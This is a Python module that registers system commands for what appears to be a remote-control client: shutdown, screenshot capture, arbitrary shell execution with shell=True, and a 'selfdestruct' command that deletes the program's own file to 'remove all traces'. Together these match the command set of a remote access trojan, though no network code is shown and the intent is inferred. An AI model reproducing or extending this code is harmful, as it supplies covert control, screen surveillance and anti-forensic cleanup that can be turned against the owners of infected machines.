import os
import time
import shutil
import subprocess
from typing import List, Tuple

import pyautogui

from commands.base_command import Command
from utils import constants, helpers

class ExitCommand(Command):
    """Exit the application."""
    
    @property
    def name(self) -> str:
        return "exit"
    
    def execute(self, *args) -> Tuple[bool, str]:
        return False, "Exiting..."

class ShutdownCommand(Command):
    """Shutdown the system."""
    
    @property
    def name(self) -> str:
        return "shutdown"
    
    def execute(self, *args) -> Tuple[bool, str]:
        try:
            if os.name == 'nt':  # Windows
                os.system("shutdown /s /t 3")
                return True, "Shutting down in 3 seconds..."
            else:  # Unix/Linux/Mac
                os.system("shutdown -h now")
                return True, "Shutting down..."
        except Exception as e:
            return False, f"Error shutting down: {e}"

class ScreenshotCommand(Command):
    """Take a screenshot."""
    
    @property
    def name(self) -> str:
        return "screenshot"
    
    def execute(self, *args) -> Tuple[bool, str]:
        try:
            timestamp = helpers.get_timestamp()
            screenshot_path = f"screenshot_{timestamp}.png"
            
            # Take the screenshot
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            
            return True, f"Screenshot saved as {screenshot_path}"
        except Exception as e:
            return False, f"Error taking screenshot: {e}"

class ExecuteCommand(Command):
    """Execute a shell command."""
    
    @property
    def name(self) -> str:
        return "exec"
    
    def execute(self, *args) -> Tuple[bool, str]:
        if not args:
            return False, "No command specified"
            
        try:
            result = subprocess.run(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=True
            )
            
            output = result.stdout if result.stdout else ""
            if result.stderr:
                output += f"\nError: {result.stderr}"
                
            return True, output or "Command executed successfully"
        except Exception as e:
            return False, f"Error executing command: {e}"

class SelfDestructCommand(Command):
    """Self-destruct and remove all traces."""
    
    @property
    def name(self) -> str:
        return "selfdestruct"
    
    def execute(self, *args) -> Tuple[bool, str]:
        try:
            # Get the current script's path
            script_path = os.path.abspath(__file__)
            
            # Remove the script file
            if os.path.exists(script_path):
                os.remove(script_path)
                
                # Remove the parent directory if it's empty
                script_dir = os.path.dirname(script_path)
                if not os.listdir(script_dir):
                    os.rmdir(script_dir)
            
            return False, "Self-destruct sequence initiated. Goodbye!"
        except Exception as e:
            return False, f"Error during self-destruct: {e}"

def register_system_commands(handler):
    """Register all system-related commands with the command handler."""
    handler.register_command(ExitCommand())
    handler.register_command(ShutdownCommand())
    handler.register_command(ScreenshotCommand())
    handler.register_command(ExecuteCommand())
    handler.register_command(SelfDestructCommand())
